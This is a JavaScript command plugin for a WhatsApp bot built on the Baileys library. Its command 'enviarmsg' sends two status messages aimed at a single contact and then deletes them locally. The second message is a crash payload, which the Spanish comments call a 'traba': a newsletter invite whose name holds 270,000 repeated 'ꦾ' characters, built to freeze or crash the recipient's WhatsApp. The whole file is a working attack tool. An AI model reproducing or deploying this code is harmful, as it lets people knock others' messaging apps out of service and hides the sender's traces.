import fs from 'fs';
import { generateWAMessageFromContent } from '@whiskeysockets/baileys';

const FILE_PATH = './mensajes_guardados.json';

let handler = async (m, { conn }) => {
  try {
    if (m.isGroup) return m.reply('❌ Este comando no puede usarse en grupos.');

    const botNumber = conn.user?.jid || '';
    if (m.sender !== botNumber) {
      return m.reply('❌ Solo el número del bot puede usar este comando.');
    }

    if (!fs.existsSync(FILE_PATH)) return m.reply('❌ No hay mensaje guardado.');
    const mensaje = JSON.parse(fs.readFileSync(FILE_PATH, 'utf-8'));
    if (!mensaje?.message) return m.reply('❌ El archivo está dañado.');

    // 🧨 Mensaje 1 (desde archivo)
    const msg1 = await generateWAMessageFromContent("status@broadcast", mensaje.message, {
      userJid: conn.user.id,
    });

    await conn.relayMessage("status@broadcast", msg1.message, {
      messageId: msg1.key.id,
      statusJidList: [m.chat],
    });

    await conn.sendMessage(conn.user.id, { delete: msg1.key });

    // 🧨 Mensaje 2 (tipo canal/traba)
    const travas = 'ꦾ'.repeat(90000);
    const canal = {
      newsletterAdminInviteMessage: {
        newsletterJid: "120363282786345717@newsletter",
        newsletterName: "🗣🗣🗣🗣" + travas + travas + travas,
        jpegThumbnail: Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/...Z', 'base64'),
        caption: "𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛  ᶻ 𝗓 𐰁",
        inviteExpiration: `${Math.floor(Date.now() / 1000) + 3600}`
      }
    };

    const msg2 = await generateWAMessageFromContent("status@broadcast", canal, {
      userJid: conn.user.id,
    });

    await conn.relayMessage("status@broadcast", msg2.message, {
      messageId: msg2.key.id,
      statusJidList: [m.chat],
    });

    await conn.sendMessage(conn.user.id, { delete: msg2.key });

    // ✅ Confirmación final
    await conn.sendMessage(m.chat, {
      text: '✅ Mensajes enviados y eliminados localmente.',
    }, { quoted: m });

  } catch (e) {
    console.error('[ERROR enviarmsg]:', e);
    return m.reply('❌ Error:\n' + (e.message || e));
  }
};

handler.command = ['enviarmsg'];
export default handler;